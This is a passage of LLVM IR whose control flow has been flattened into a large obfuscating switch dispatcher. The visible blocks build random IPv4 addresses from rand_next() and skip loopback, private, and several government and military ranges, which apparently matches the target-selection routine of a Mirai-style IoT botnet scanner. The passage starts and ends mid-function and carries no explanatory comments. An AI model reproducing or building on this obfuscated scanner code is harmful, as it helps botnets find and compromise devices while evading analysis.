    i32 -1000572808, label %358
    i32 -1611901348, label %363
    i32 1938420883, label %368
    i32 276549235, label %373
    i32 715454050, label %378
    i32 -783335268, label %383
    i32 1213671620, label %388
    i32 -1328574616, label %393
    i32 -721087869, label %398
    i32 -779196620, label %403
    i32 269053550, label %408
    i32 -791047576, label %413
    i32 1869769776, label %418
    i32 -278485080, label %423
    i32 -655588798, label %428
    i32 -608656919, label %433
    i32 421092030, label %438
    i32 533644520, label %443
    i32 -1835177391, label %448
    i32 -1370870659, label %453
    i32 -413479631, label %458
    i32 292683985, label %463
    i32 -41677309, label %468
    i32 1085612562, label %473
    i32 -2049058587, label %478
    i32 2019957407, label %483
    i32 921827208, label %488
    i32 -909267514, label %493
    i32 -44512936, label %498
    i32 807153805, label %503
    i32 2126274594, label %508
    i32 1277061850, label %513
    i32 -1052032188, label %518
    i32 -1960976039, label %523
    i32 -2120159738, label %528
    i32 1752442977, label %533
    i32 -1541140100, label %538
    i32 304857555, label %543
    i32 257033251, label %548
    i32 1326709101, label %553
    i32 -2116382062, label %558
    i32 -538569901, label %563
    i32 -1872530230, label %568
    i32 814938097, label %573
    i32 -10034970, label %578
    i32 -1206023047, label %583
    i32 -1453268912, label %588
    i32 -1155685680, label %593
    i32 -358539224, label %598
    i32 -770713152, label %603
    i32 -220623755, label %608
    i32 1023208173, label %613
    i32 806914545, label %618
    i32 -634114840, label %623
    i32 667125268, label %628
    i32 -1548625727, label %633
    i32 155338037, label %638
    i32 -180605845, label %643
    i32 -1603970235, label %648
    i32 -650568076, label %653
    i32 -491445705, label %658
    i32 -822776006, label %663
    i32 1692285255, label %668
    i32 -2028759450, label %673
    i32 -1202656562, label %678
    i32 1540230783, label %683
    i32 687457580, label %688
    i32 -38024677, label %693
    i32 -1993107925, label %698
    i32 1926800235, label %703
    i32 -1054509648, label %708
    i32 -1256674764, label %713
    i32 2053167599, label %718
    i32 1009691773, label %723
    i32 2052015793, label %728
    i32 1676436158, label %733
    i32 1609744867, label %738
    i32 1044130449, label %743
    i32 -867071395, label %748
    i32 162154332, label %753
    i32 -1161187232, label %758
    i32 -1675554907, label %763
    i32 -1478930243, label %768
    i32 1590872107, label %773
    i32 -1633702977, label %778
    i32 1603822377, label %783
    i32 -1419584949, label %788
    i32 -75600524, label %793
    i32 663646928, label %798
    i32 -1206293070, label %803
    i32 1624601641, label %808
    i32 -602195871, label %813
    i32 -1094989215, label %818
    i32 1753870815, label %823
    i32 1313878273, label %828
    i32 677532394, label %833
    i32 9099091, label %838
    i32 -1453183615, label %843
    i32 -341202326, label %848
    i32 423164643, label %853
    i32 -635882924, label %858
    i32 -1890041907, label %863
    i32 591412829, label %868
    i32 1832966508, label %873
    i32 328570711, label %878
    i32 -1672925298, label %883
    i32 467486671, label %888
    i32 -3695770, label %893
    i32 893972260, label %898
    i32 1702646049, label %903
    i32 1760726468, label %908
    i32 65161229, label %913
    i32 1145627033, label %918
    i32 -836896996, label %923
    i32 -65777847, label %928
    i32 -439353268, label %933
    i32 -941038200, label %938
    i32 531144462, label %943
    i32 795057444, label %948
    i32 -1626552757, label %953
    i32 -1947005270, label %958
    i32 949707414, label %963
    i32 1130384658, label %968
    i32 1329150230, label %973
    i32 1507696622, label %978
    i32 -2044042098, label %983
    i32 -1720913323, label %988
    i32 1788645492, label %993
    i32 1997618134, label %998
    i32 371596927, label %1003
    i32 284323264, label %1008
    i32 145061273, label %1013
    i32 133578025, label %1018
    i32 -934423371, label %1023
    i32 2080404242, label %1028
    i32 -1882962303, label %1033
    i32 589019583, label %1038
    i32 -1840561514, label %1043
    i32 137791144, label %1048
    i32 2132994741, label %1053
    i32 -1152922171, label %1058
    i32 219428119, label %1063
    i32 1197455952, label %1068
    i32 -389312207, label %1073
    i32 279686411, label %1078
    i32 921387261, label %1083
    i32 -1707377023, label %1088
    i32 1032414070, label %1093
    i32 -365539860, label %1098
    i32 -1424695597, label %1103
    i32 1927953731, label %1108
    i32 -1440536095, label %1113
    i32 1417458216, label %1118
    i32 -579897745, label %1123
    i32 1407972868, label %1128
    i32 -1803893924, label %1133
    i32 1540904400, label %1138
    i32 -563211748, label %1143
    i32 54843668, label %1148
    i32 -733316293, label %1153
    i32 -273650039, label %1158
    i32 -1252950198, label %1163
    i32 -908305144, label %1168
    i32 -1649768052, label %1173
    i32 -364519820, label %1178
    i32 1953579265, label %1183
    i32 -1161576905, label %1188
    i32 558476829, label %1193
    i32 -721253711, label %1198
    i32 -2058194110, label %1203
    i32 -2102423558, label %1208
    i32 -860629753, label %1213
    i32 -719864651, label %1218
    i32 -1439564051, label %1223
    i32 1384385193, label %1228
    i32 604519194, label %1233
    i32 -1889640755, label %1238
    i32 1492607409, label %1243
    i32 1898282312, label %1248
    i32 1126886985, label %1253
    i32 1242037602, label %1258
    i32 1414585896, label %1263
    i32 -1598209106, label %1268
    i32 1162741723, label %1273
    i32 -2106027447, label %1278
    i32 87002838, label %1283
    i32 1501729156, label %1288
    i32 -388379543, label %1293
    i32 -659610755, label %1298
    i32 1719145220, label %1303
    i32 -450244743, label %1308
    i32 -561546902, label %1313
    i32 268362610, label %1318
    i32 -1148487790, label %1323
    i32 -2019620684, label %1328
    i32 1520112040, label %1333
    i32 -123035818, label %1338
    i32 -2060805917, label %1343
    i32 -578267699, label %1348
    i32 50097348, label %1353
    i32 -1569961814, label %1358
    i32 -672708958, label %1363
    i32 -1344658420, label %1368
    i32 -728707659, label %1373
    i32 1692488665, label %1378
    i32 1712284131, label %1383
    i32 -1619507099, label %1388
    i32 -197855166, label %1393
    i32 -1038997447, label %1398
    i32 402265505, label %1403
    i32 1644728918, label %1408
    i32 1772528185, label %1413
    i32 232623245, label %1418
    i32 -379020917, label %1423
    i32 1490519949, label %1428
    i32 -1802337066, label %1433
    i32 1315605040, label %1438
    i32 1589444164, label %1443
    i32 -1380442122, label %1448
    i32 1848831446, label %1453
    i32 1938040508, label %1458
    i32 84927246, label %1463
    i32 -309437642, label %1468
    i32 -1627306357, label %1473
    i32 1405009187, label %1478
    i32 -1577907671, label %1483
    i32 1360763266, label %1488
    i32 -1184935427, label %1493
    i32 -387423603, label %1498
    i32 -1974462385, label %1503
    i32 -1796405912, label %1508
    i32 -576196374, label %1513
    i32 2072412937, label %1518
    i32 -191827386, label %1523
    i32 -1642497096, label %1528
    i32 -939032143, label %1533
    i32 1084226078, label %1538
    i32 -318218629, label %1543
    i32 -282062130, label %1548
    i32 -496360396, label %1553
    i32 -1844917019, label %1558
    i32 -1179854280, label %1563
    i32 -1341792502, label %1568
    i32 2025548676, label %1573
    i32 1914461472, label %1578
    i32 1064812132, label %1583
    i32 -1219874632, label %1588
    i32 510118745, label %1593
    i32 1670510978, label %1598
    i32 -1292701789, label %1603
    i32 -593296518, label %1608
    i32 331217133, label %1613
    i32 1975731762, label %1618
    i32 -606819938, label %1623
    i32 239720598, label %1628
    i32 570697171, label %1633
    i32 367562169, label %1638
    i32 958136897, label %1643
    i32 -961310531, label %1648
    i32 -1481836456, label %1653
    i32 1479944633, label %1658
    i32 -758972590, label %1663
    i32 2094583289, label %1668
    i32 -537221729, label %1673
    i32 1584496523, label %1678
    i32 33835649, label %1683
    i32 307247806, label %1688
    i32 352848903, label %1693
    i32 173500211, label %1698
    i32 -1844653426, label %1703
    i32 1157124307, label %1708
    i32 277298684, label %1713
    i32 -998016767, label %1718
    i32 -662589339, label %1723
    i32 562776126, label %1728
    i32 301874441, label %1733
    i32 -1671746300, label %1738
    i32 412931321, label %1743
    i32 -1658639404, label %1748
    i32 1203166537, label %1753
    i32 -856922715, label %1758
    i32 1290463508, label %1763
    i32 -439175329, label %1768
    i32 -67886789, label %1773
    i32 -990833061, label %1778
    i32 1735819643, label %1783
    i32 -1055296893, label %1788
    i32 219447437, label %1793
    i32 -729833917, label %1798
    i32 -1195472046, label %1803
    i32 -372664331, label %1808
    i32 1296392233, label %1813
    i32 882788156, label %1818
    i32 -1949144523, label %1823
    i32 -432544531, label %1828
    i32 444521258, label %1833
    i32 1080638488, label %1838
    i32 -1467942874, label %1843
    i32 1118046312, label %1848
    i32 -21224446, label %1853
    i32 642509354, label %1858
    i32 -848873157, label %1863
    i32 668861270, label %1868
    i32 -98159479, label %1873
    i32 -2105470198, label %1878
    i32 -741293641, label %1883
    i32 2018483450, label %1888
    i32 -929984780, label %1893
    i32 294912594, label %1898
    i32 -24028005, label %1903
    i32 1979610042, label %1908
    i32 -74713848, label %1913
    i32 1320728041, label %1918
    i32 -1637839062, label %1923
    i32 -698902695, label %1928
    i32 -16709834, label %1933
    i32 1021826458, label %1938
    i32 1686708865, label %1943
    i32 269881623, label %1948
    i32 -1720245468, label %1953
    i32 -1826914494, label %1958
    i32 -678823952, label %1963
    i32 382736159, label %1968
    i32 1538526059, label %1973
    i32 -1119793578, label %1978
    i32 -835866345, label %1983
    i32 -1148145683, label %1988
    i32 -1342911860, label %1993
    i32 265770948, label %1998
    i32 209722062, label %2003
    i32 856532430, label %2008
    i32 893946818, label %2013
    i32 -1394745655, label %2018
    i32 -1752919217, label %2023
    i32 -1541546271, label %2028
    i32 -1236275930, label %2033
    i32 2137863744, label %2038
    i32 1245755446, label %2043
    i32 304461282, label %2048
    i32 -352078105, label %2053
    i32 2010509319, label %2058
    i32 2038755662, label %2063
    i32 1598762833, label %2068
    i32 337144242, label %2073
    i32 -2101484438, label %2078
    i32 1626095381, label %2083
    i32 566094961, label %2088
    i32 -1036091355, label %2093
    i32 261938107, label %2098
    i32 713886707, label %2103
    i32 -1366945578, label %2108
    i32 -298947767, label %2113
    i32 43335116, label %2118
    i32 -131390907, label %2123
    i32 958878063, label %2128
    i32 -777889711, label %2133
    i32 -1513608242, label %2138
    i32 -1811332985, label %2143
    i32 980827379, label %2148
    i32 -1246768723, label %2153
    i32 -31288960, label %2158
    i32 1550474231, label %2163
    i32 -573623237, label %2168
    i32 -860641718, label %2173
    i32 -2051461382, label %2178
    i32 -1673810284, label %2183
    i32 894558408, label %2188
    i32 -946504490, label %2193
    i32 864958201, label %2198
    i32 2037425044, label %2203
    i32 -864593151, label %2208
    i32 -1386108308, label %2213
    i32 1030556501, label %2218
    i32 -399484337, label %2223
    i32 13561654, label %2228
    i32 1645749844, label %2233
    i32 -1066752965, label %2238
    i32 1146118748, label %2243
    i32 -1910958790, label %2248
    i32 718300386, label %2253
    i32 -1518951031, label %2258
    i32 193614505, label %2263
    i32 1924017880, label %2268
    i32 -1652767010, label %2273
    i32 -20492473, label %2278
    i32 1077903947, label %2283
    i32 547039613, label %2288
    i32 -671412553, label %2293
    i32 1497595639, label %2298
    i32 1727550516, label %2303
    i32 -454950990, label %2308
    i32 -1452004351, label %2313
    i32 -685801699, label %2318
    i32 749795254, label %2323
    i32 -1116407870, label %2328
    i32 -1642019990, label %2333
    i32 -731207375, label %2338
    i32 -983542020, label %2343
    i32 1734832982, label %2348
    i32 1672754746, label %2353
    i32 -900518505, label %2358
    i32 1096913761, label %2363
    i32 643009036, label %2368
    i32 1045338205, label %2373
    i32 9082897, label %2378
    i32 1683753647, label %2383
    i32 1775877460, label %2388
    i32 -1246153676, label %2393
    i32 116059995, label %2398
    i32 -1268041238, label %2403
    i32 672115686, label %2408
    i32 -658136503, label %2413
    i32 1468029963, label %2418
    i32 1351587047, label %2423
    i32 -1734389181, label %2428
    i32 -82682686, label %2433
    i32 270841293, label %2438
    i32 1825563961, label %2443
    i32 1102766922, label %2448
    i32 1583654770, label %2453
    i32 -208487629, label %2458
    i32 1481710653, label %2463
    i32 1981118687, label %2468
    i32 2110712171, label %2473
    i32 1738694669, label %2478
    i32 1343284571, label %2483
    i32 1612589610, label %2488
    i32 -1454458667, label %2493
    i32 -102880607, label %2498
    i32 -911895179, label %2503
    i32 1487055813, label %2508
    i32 -511958314, label %2513
    i32 1851330361, label %2518
    i32 1023979996, label %2523
    i32 1159884383, label %2528
    i32 538046364, label %2533
    i32 1847046415, label %2538
    i32 -1632879794, label %2543
    i32 -886317280, label %2548
    i32 1027477624, label %2553
    i32 -79900131, label %2558
    i32 -1448110092, label %2563
    i32 713700903, label %2568
    i32 366481858, label %2573
    i32 159418938, label %2578
    i32 1529651006, label %2583
    i32 43864335, label %2588
    i32 -1274117037, label %2593
    i32 -2108562417, label %2598
    i32 130025370, label %2603
    i32 -824868655, label %2608
    i32 -1012696758, label %2613
    i32 -1563200280, label %2618
    i32 1195088447, label %2623
    i32 1057384230, label %2628
    i32 1774342067, label %2633
    i32 -878029768, label %2638
    i32 -426474787, label %2643
    i32 1301520419, label %2648
    i32 -1845210996, label %2653
    i32 -645046710, label %2658
    i32 -867149627, label %2663
    i32 -652498588, label %2668
    i32 -1596956305, label %2673
    i32 572704002, label %2678
    i32 -1248071113, label %2683
    i32 1305380603, label %2688
    i32 -234532416, label %2693
    i32 1641849451, label %2698
    i32 -1665184934, label %2703
    i32 245541082, label %2708
    i32 1388238865, label %2713
    i32 1669401898, label %2718
    i32 -1315609850, label %2723
    i32 -707178766, label %2728
    i32 1262254553, label %2733
    i32 -2072637050, label %2738
    i32 1634459401, label %2743
    i32 -1475921090, label %2748
    i32 -298075234, label %2753
    i32 -566595132, label %2758
    i32 1491655755, label %2763
    i32 -276249081, label %2768
    i32 -649601022, label %2773
    i32 1231315148, label %2778
    i32 -1056904690, label %2783
    i32 1203229400, label %2788
    i32 -1123595069, label %2793
    i32 -155839525, label %2798
    i32 446160188, label %2803
    i32 -590953133, label %2808
    i32 962855743, label %2813
    i32 366238630, label %2818
    i32 210920334, label %2823
    i32 1791676274, label %2828
    i32 -881321777, label %2833
    i32 2088178526, label %2838
    i32 -289131593, label %2843
    i32 1748339016, label %2848
    i32 -1145895189, label %2853
    i32 -793602611, label %2858
    i32 1754678385, label %2863
    i32 -2143075683, label %2868
    i32 -1111816754, label %2873
    i32 1541796805, label %2878
    i32 -809345522, label %2883
    i32 1839754081, label %2887
    i32 1358318879, label %2889
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = and i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* %2, align 1
  %11 = load i32, i32* %1, align 4
  %12 = lshr i32 %11, 8
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %1, align 4
  %16 = lshr i32 %15, 16
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %1, align 4
  %20 = lshr i32 %19, 24
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  store i32 1989390093, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8, i8* %2, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 127
  %27 = select i1 %26, i32 1839754081, i32 -125811873
  store i32 %27, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i8, i8* %2, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 0
  %32 = select i1 %31, i32 1839754081, i32 554311231
  store i32 %32, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8, i8* %2, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 3
  %37 = select i1 %36, i32 1839754081, i32 2141195428
  store i32 %37, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i8, i8* %2, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 15
  %42 = select i1 %41, i32 1839754081, i32 1168710303
  store i32 %42, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8, i8* %2, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 56
  %47 = select i1 %46, i32 1839754081, i32 770950567
  store i32 %47, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8, i8* %2, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 10
  %52 = select i1 %51, i32 1839754081, i32 687679617
  store i32 %52, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8, i8* %2, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 25
  %57 = select i1 %56, i32 1839754081, i32 134987165
  store i32 %57, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8, i8* %2, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 49
  %62 = select i1 %61, i32 1839754081, i32 -241189096
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8, i8* %2, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 50
  %67 = select i1 %66, i32 1839754081, i32 248730737
  store i32 %67, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8, i8* %2, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp eq i32 %70, 137
  %72 = select i1 %71, i32 1839754081, i32 -688825959
  store i32 %72, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8, i8* %2, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 6
  %77 = select i1 %76, i32 1839754081, i32 417878016
  store i32 %77, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8, i8* %2, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 7
  %82 = select i1 %81, i32 1839754081, i32 -829175959
  store i32 %82, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i8, i8* %2, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 11
  %87 = select i1 %86, i32 1839754081, i32 2135692023
  store i32 %87, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i8, i8* %2, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 21
  %92 = select i1 %91, i32 1839754081, i32 -854615820
  store i32 %92, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8, i8* %2, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 22
  %97 = select i1 %96, i32 1839754081, i32 1218045218
  store i32 %97, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i8, i8* %2, align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 26
  %102 = select i1 %101, i32 1839754081, i32 524798225
  store i32 %102, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %2, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 28
  %107 = select i1 %106, i32 1839754081, i32 618871075
  store i32 %107, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i8, i8* %2, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 29
  %112 = select i1 %111, i32 1839754081, i32 392099142
  store i32 %112, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i8, i8* %2, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 30
  %117 = select i1 %116, i32 1839754081, i32 253574911
  store i32 %117, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8, i8* %2, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 33
  %122 = select i1 %121, i32 1839754081, i32 -1863455081
  store i32 %122, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i8, i8* %2, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 55
  %127 = select i1 %126, i32 1839754081, i32 1100351015
  store i32 %127, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i8, i8* %2, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 214
  %132 = select i1 %131, i32 1839754081, i32 -883919577
  store i32 %132, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8, i8* %2, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 215
  %137 = select i1 %136, i32 1839754081, i32 -2037411729
  store i32 %137, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load i8, i8* %2, align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 192
  %142 = select i1 %141, i32 -2144041976, i32 2131185914
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 168
  %147 = select i1 %146, i32 1839754081, i32 2131185914
  store i32 %147, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i8, i8* %2, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 146
  %152 = select i1 %151, i32 -932039609, i32 -737134909
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i8, i8* %3, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 17
  %157 = select i1 %156, i32 1839754081, i32 -737134909
  store i32 %157, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8, i8* %2, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 146
  %162 = select i1 %161, i32 -1665167464, i32 -20951661
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i8, i8* %3, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 80
  %167 = select i1 %166, i32 1839754081, i32 -20951661
  store i32 %167, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8, i8* %2, align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 146
  %172 = select i1 %171, i32 -1918865593, i32 -773109248
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i8, i8* %3, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp eq i32 %175, 98
  %177 = select i1 %176, i32 1839754081, i32 -773109248
  store i32 %177, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i8, i8* %2, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 146
  %182 = select i1 %181, i32 -1384755274, i32 768371288
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8, i8* %3, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 154
  %187 = select i1 %186, i32 1839754081, i32 768371288
  store i32 %187, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8, i8* %2, align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 147
  %192 = select i1 %191, i32 936472970, i32 2066917799
  store i32 %192, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i8, i8* %3, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 159
  %197 = select i1 %196, i32 1839754081, i32 2066917799
  store i32 %197, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i8, i8* %2, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 148
  %202 = select i1 %201, i32 740981050, i32 -1357290300
  store i32 %202, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8, i8* %3, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 114
  %207 = select i1 %206, i32 1839754081, i32 -1357290300
  store i32 %207, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i8, i8* %2, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 150
  %212 = select i1 %211, i32 -136274487, i32 2067462910
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i8, i8* %3, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp eq i32 %215, 125
  %217 = select i1 %216, i32 1839754081, i32 2067462910
  store i32 %217, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8, i8* %2, align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 150
  %222 = select i1 %221, i32 -620694938, i32 -895947735
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8, i8* %3, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 133
  %227 = select i1 %226, i32 1839754081, i32 -895947735
  store i32 %227, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i8, i8* %2, align 1
  %230 = zext i8 %229 to i32
  %231 = icmp eq i32 %230, 150
  %232 = select i1 %231, i32 1311628141, i32 -410523864
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8, i8* %3, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 144
  %237 = select i1 %236, i32 1839754081, i32 -410523864
  store i32 %237, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i8, i8* %2, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 150
  %242 = select i1 %241, i32 -1355281080, i32 -15707370
  store i32 %242, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8, i8* %3, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 149
  %247 = select i1 %246, i32 1839754081, i32 -15707370
  store i32 %247, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i8, i8* %2, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 150
  %252 = select i1 %251, i32 -1612477371, i32 -865296584
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8, i8* %3, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp eq i32 %255, 157
  %257 = select i1 %256, i32 1839754081, i32 -865296584
  store i32 %257, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i8, i8* %2, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 150
  %262 = select i1 %261, i32 854766564, i32 1768725582
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8, i8* %3, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp eq i32 %265, 184
  %267 = select i1 %266, i32 1839754081, i32 1768725582
  store i32 %267, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i8, i8* %2, align 1
  %270 = zext i8 %269 to i32
  %271 = icmp eq i32 %270, 150
  %272 = select i1 %271, i32 2112046597, i32 474781686
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i8, i8* %3, align 1
  %275 = zext i8 %274 to i32
  %276 = icmp eq i32 %275, 190
  %277 = select i1 %276, i32 1839754081, i32 474781686
  store i32 %277, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i8, i8* %2, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 150
  %282 = select i1 %281, i32 563433819, i32 235745372
  store i32 %282, i32* %switchVar
  br label %loopEnd

